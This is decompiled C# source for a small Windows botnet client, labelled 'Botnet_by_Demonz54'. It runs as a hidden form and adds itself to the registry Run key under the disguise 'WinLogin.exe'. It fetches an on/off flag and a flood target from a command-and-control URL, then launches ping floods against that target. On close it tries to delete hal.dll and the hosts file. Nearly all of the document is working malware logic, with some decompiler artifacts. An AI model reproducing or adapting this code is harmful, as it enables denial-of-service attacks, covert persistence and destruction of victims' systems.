using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Botnet_by_Demonz54;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	private WebClient Infnum;

	private string Inf;

	private WebClient URLFLOOD;

	private string SELECTED;

	private string FileName;

	private object FilePath;

	private object Registrykey;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		components = new Container();
		Label1 = new Label();
		Timer1 = new Timer(components);
		Label2 = new Label();
		Timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		Label label = Label1;
		Point location = new Point(13, 0);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(0, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		((Control)Label1).set_Visible(false);
		Timer1.set_Interval(5);
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(13, 4);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(0, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		((Control)Label2).set_Visible(false);
		Timer2.set_Interval(5);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(30, 25);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		FileName = "WinLogin.exe";
		FilePath = Path.GetFullPath(FileName);
		Registrykey = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell", ""));
		object registrykey = Registrykey;
		object[] array = new object[2]
		{
			"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Winlogin",
			RuntimeHelpers.GetObjectValue(FilePath)
		};
		bool[] array2 = new bool[2] { false, true };
		NewLateBinding.LateCall(registrykey, (Type)null, "RegWrite", array, (string[])null, (Type[])null, array2, true);
		if (array2[1])
		{
			FilePath = RuntimeHelpers.GetObjectValue(array[1]);
		}
		TMListViewDelete.Running = true;
		try
		{
			Inf = Encoding.ASCII.GetString(Infnum.DownloadData("http://userks5f46.kodingen.com/botnet/On-Off.aspx/"));
			Label1.set_Text(Inf);
			SELECTED = Encoding.ASCII.GetString(URLFLOOD.DownloadData("http://userks5f46.kodingen.com/botnet/FLOODURL.aspx/"));
			Label2.set_Text(SELECTED);
			Timer1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer2.Start();
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					if (Operators.CompareString(Label1.get_Text(), "on", false) != 0)
					{
						goto end_IL_0000;
					}
					goto IL_001b;
				case 110:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000_2;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_001b;
						case 3:
							goto end_IL_0000_3;
						default:
							goto end_IL_0000_2;
						case 4:
						case 5:
							goto end_IL_0000;
						}
						goto default;
					}
					IL_001b:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
					end_IL_0000_3:
					break;
				}
				num = 3;
				Interaction.Shell("ping" + Label2.get_Text() + "-165000", (AppWinStyle)2, false, -1);
				break;
				end_IL_0000_2:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 110;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Inf = Encoding.ASCII.GetString(Infnum.DownloadData("http://url/On-Off.aspx/"));
		Label1.set_Text(Inf);
		SELECTED = Encoding.ASCII.GetString(URLFLOOD.DownloadData("http://url/FLOODURL.aspx/"));
		Label2.set_Text(SELECTED);
		Timer1.Start();
	}

	private void Form1_FormClosed(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 66:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0008:
					num = 2;
					FileSystem.Kill("%windir%\\system32\\hal.dll");
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				FileSystem.Kill("%windir%\\system32\\drivers\\etc\\hosts");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 66;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
